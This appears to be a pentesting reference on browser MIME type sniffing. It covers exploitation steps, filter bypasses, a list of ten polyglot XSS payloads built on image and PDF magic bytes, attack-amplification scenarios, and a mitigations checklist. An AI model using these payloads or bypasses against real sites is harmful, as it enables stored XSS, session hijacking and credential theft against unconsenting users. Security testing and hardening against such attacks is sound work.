## 1. Overview

**What is MIME Type Sniffing?**

MIME type sniffing is a browser behavior where the browser attempts to determine a resource's content type by examining its actual content, rather than trusting the declared `Content-Type` header. While this feature was designed to improve user experience by handling incorrectly configured servers, it introduces significant security risks.

**The Security Risk:**

Attackers can exploit MIME sniffing by embedding malicious HTML/JavaScript code inside files with seemingly safe extensions (like `.jpg`, `.txt`, `.pdf`). When a browser "sniffs" the content and detects HTML markup, it may render the file as HTML instead of the declared type, leading to Cross-Site Scripting (XSS) attacks.

**How Different Browsers Behave:**

Each browser implements MIME sniffing differently, but the core vulnerability remains consistent: content can be misinterpreted, bypassing security controls that rely on file extensions or declared MIME types.

---

## 2. Exploitation Methods

### 🎯 Attack Prerequisites

**Check for Vulnerability:**

- [ ] Target allows user-uploaded content
- [ ] Server doesn't set `X-Content-Type-Options: nosniff` header
- [ ] Files are served with weak or incorrect `Content-Type` headers
- [ ] Browser performs MIME sniffing on the target domain

### 🔥 Step-by-Step Exploitation

**Method 1: Malicious Image Upload**

1. **Prepare Payload File**
    
    - Create a file containing both valid image data and HTML/JS code
    - Example: Prefix HTML with image magic bytes
2. **Upload to Target**
    
    - Upload file with image extension (`.jpg`, `.png`, `.gif`)
    - Note the publicly accessible URL
3. **Trigger MIME Sniffing**
    
    - Direct victim to the uploaded file URL
    - Browser detects HTML content and executes JavaScript
    - Result: XSS in the context of the vulnerable domain

**Method 2: Content-Type Mismatch**

1. **Identify Upload Endpoints**
    
    - Find file upload functionality
    - Test what MIME types are accepted/served
2. **Craft Polyglot File**
    
    - Create file that's valid in multiple formats
    - Embed HTML/JavaScript payload
    - Save with non-HTML extension
3. **Exploit the Sniffing**
    
    - Upload file claiming to be image/text/PDF
    - Access file directly via URL
    - Browser sniffs HTML and executes code

**Method 3: Text File HTML Injection**

1. **Target Text File Uploads**
    
    - Find endpoints serving `.txt` files
    - Upload file containing HTML markup
2. **Leverage Browser Behavior**
    
    - Craft HTML with `<script>` tags in `.txt` file
    - Older browsers or misconfigured servers will render as HTML
    - Execute JavaScript in victim's browser

### ✅ Verification Steps

**Confirm Vulnerability:**

```bash
# Check for X-Content-Type-Options header
curl -I https://target.com/uploads/test.jpg

# Look for absence of:
# X-Content-Type-Options: nosniff
```

**Test MIME Sniffing:**

- Upload test file with HTML content but image extension
- Access file directly in browser
- Check if HTML is rendered or downloaded as image

---

## 3. Bypasses

### 🚀 Defense Evasion Techniques

**Bypass 1: Magic Bytes Prefixing**

When content filtering checks file headers, prefix your HTML payload with valid file format magic bytes:

```
GIF89a<script>alert(document.domain)</script>
```

**Bypass 2: Polyglot Files**

Create files that are simultaneously valid in multiple formats:

- Valid GIF + Valid HTML
- Valid PDF + Valid JavaScript
- Valid PNG + Valid SVG with embedded scripts

**Bypass 3: Content-Type Confusion**

- Upload with ambiguous extensions (`.svg`, `.xml`)
- These are text-based formats that can contain scripts
- Servers may serve with generic `text/plain` or `application/xml`
- Browsers may still execute embedded scripts

**Bypass 4: Character Encoding Tricks**

- Use UTF-7 or other encodings to hide HTML tags
- Some browsers may decode and execute
- Combine with missing charset declaration

**Bypass 5: Case Sensitivity Exploitation**

- Upload files with mixed-case extensions (`.JpG`, `.GiF`)
- Some servers treat these differently than lowercase
- May bypass extension-based filtering while still being sniffed

---

## 4. Payloads

### 💉 Top 10 Modern MIME Sniffing Payloads

**1. Basic GIF + XSS Polyglot**

```html
GIF89a/*<script>alert(document.domain)</script>*/=alert(document.domain)//
```

**2. Minimal HTML in Image**

```html
GIF89a<svg/onload=alert(document.domain)>
```

**3. Text File HTML Injection**

```html
<html><body><script>alert(document.domain)</script></body></html>
```

**4. PNG with Embedded Script**

```html
‰PNG
<script>alert(document.domain)</script>
```

**5. Multi-Browser Polyglot**

```html
GIF89a=<script>alert(1)</script>
```

**6. SVG MIME Confusion**

```xml
<svg xmlns="http://www.w3.org/2000/svg"><script>alert(origin)</script></svg>
```

**7. PDF JavaScript Injection**

```html
%PDF-1.4<script>alert(document.domain)</script>
```

**8. JPEG Comment XSS**

```html
ÿØÿà<!--<script>alert(1)</script>-->
```

**9. CSV with HTML**

```html
test,data
<script>alert(document.domain)</script>
```

**10. XML External Entity + Script**

```xml
<?xml version="1.0"?><html><script>alert(document.domain)</script></html>
```

---

## 5. Higher Impact Scenarios

### 🎯 Amplifying the Attack

**Scenario 1: Stored XSS via File Upload**

- Upload malicious file to user profile/avatar
- File persists on server
- Every visitor to profile triggers XSS
- **Impact:** Account takeover, session hijacking, data theft

**Scenario 2: Bypassing CSP**

- Target has Content Security Policy
- Upload malicious file to same-origin
- CSP allows same-origin scripts
- MIME sniffing executes your payload despite CSP
- **Impact:** CSP bypass leading to full XSS

**Scenario 3: Admin Panel Exploitation**

- Upload malicious file visible to administrators
- Admin views file in privileged context
- Execute actions with admin privileges
- **Impact:** Full application compromise, privilege escalation

**Scenario 4: Intranet Pivoting**

- Upload file to externally-facing server
- Use XSS to probe internal network
- Access internal resources via victim's browser
- **Impact:** Internal network reconnaissance, lateral movement

**Scenario 5: Mass User Compromise**

- Upload malicious file to shared resource area
- Multiple users access the file
- Harvest credentials/sessions from all victims
- **Impact:** Large-scale data breach, credential theft

**Scenario 6: Worm Propagation**

- XSS payload automatically uploads itself as other users
- Self-replicating attack spreads through platform
- **Impact:** Widespread compromise, difficult remediation

---

## 6. Mitigations

### 🛡️ Defense Strategy

**For Developers:**

**1. Implement X-Content-Type-Options Header**

```
X-Content-Type-Options: nosniff
```

- Forces browsers to respect declared Content-Type
- **Priority:** CRITICAL - Deploy immediately

**2. Set Correct Content-Type Headers**

```
Content-Type: image/jpeg
Content-Type: application/pdf
Content-Type: text/plain; charset=utf-8
```

- Always specify accurate MIME types
- Include charset for text-based content

**3. Serve User Content from Separate Domain**

- Use dedicated CDN or subdomain for uploads
- Example: `uploads.example.com` instead of `example.com`
- Isolates XSS impact from main application

**4. Implement Content Security Policy**

```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

- Provides defense-in-depth
- Limits damage if MIME sniffing occurs

**5. Validate File Content**

- Don't trust file extensions
- Verify actual file format using magic bytes
- Reject files with embedded HTML/scripts

**6. Sanitize Uploaded Files**

- Strip metadata and potentially dangerous content
- Re-encode images to remove embedded data
- Use server-side image processing libraries

**7. Force Download Instead of Display**

```
Content-Disposition: attachment; filename="file.jpg"
```

- Prevents browser rendering
- Forces file download

**For Security Teams:**

**Testing Checklist:**

- [ ] Verify `X-Content-Type-Options: nosniff` on all endpoints
- [ ] Test file upload with HTML-embedded images
- [ ] Check if user content is served from isolated domain
- [ ] Validate CSP configuration
- [ ] Attempt polyglot file uploads
- [ ] Review Content-Type headers for accuracy

**Monitoring:**

- Log all file uploads with content type validation
- Alert on files with mismatched extension/content
- Track unusual file access patterns

---

## 📚 Resources

- [KeyCDN - What is MIME Sniffing](https://www.keycdn.com/support/what-is-mime-sniffing)
- [Denim Group - MIME Sniffing Security Implications](https://www.denimgroup.com/resources/blog/2019/05/mime-sniffing-in-browsers-and-the-security-implications/)
- [Mozilla Security - Mitigating MIME Confusion Attacks](https://blog.mozilla.org/security/2016/08/26/mitigating-mime-confusion-attacks-in-firefox/)
- [WHATWG MIME Sniffing Specification](https://mimesniff.spec.whatwg.org/)
- [MDN - X-Content-Type-Options](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options)
- [MDN - Content-Type Header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Type)
- [MDN - MIME Types](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types)

---

**🚀 Pro Tip:** When testing for MIME sniffing vulnerabilities, always start with the simplest payload and progressively increase complexity. Document every finding systematically—your future self will thank you!